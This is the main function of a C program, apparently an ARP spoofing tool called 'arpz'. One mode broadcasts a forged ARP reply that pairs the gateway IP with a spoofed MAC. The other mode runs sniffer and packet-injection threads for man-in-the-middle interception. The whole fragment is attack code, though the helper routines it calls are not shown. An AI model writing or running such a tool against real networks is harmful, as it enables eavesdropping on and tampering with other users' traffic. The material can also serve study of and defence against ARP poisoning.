main (int argc, char *argv[]) {
    int mode, sockfd;
    char gwip[20], tgtip[20], rstfile[20];
	extern char device[];
    char *pkt;

    ParseCmd(argc, argv, &mode, gwip, tgtip, rstfile, device);

    if (mode == 0) {
        if (strlen(gwip) == 0 || strlen(device) == 0) {
            fprintf(stderr, "\nUsage:arpz -g <gateway ip> -d <device>\n\n");
            exit(-1);
        }


        sockfd = CreateRawSocket(ETH_P_ALL);

        BindToInterface(sockfd, device, ETH_P_ARP);


        pkt = malloc(sizeof(struct ethernet_header) + sizeof(struct arp_header));
        CreateEtherHeader(pkt, BRAODCAST_MAC, SPOOFED_MAC, ETH_P_ARP);
        CreateARPHeader(pkt, SPOOFED_MAC, gwip, BRAODCAST_MAC, tgtip);
        SendPacket(sockfd, pkt, sizeof(struct ethernet_header) + sizeof(struct arp_header));
    }else if (mode == 1) {
		pthread_t sniffer, injector;
		int msgq;


		msgq = CreateMsgQu();

		printf("Main %d\n", msgq);


		if ((pthread_create(&sniffer, NULL, SnifferThread, &msgq)) != 0) {
		printf("Error Create Threads\n");
		exit(-1);
		}

		if ((pthread_create(&injector, NULL, InjectionThread, &msgq)) != 0) {
		printf("Error Create Threads\n");
		exit(-1);
		}


		pthread_join(sniffer, NULL);
		pthread_join(injector, NULL);


		DestroyMsgQ(msgq);
    }

    return 0;
}
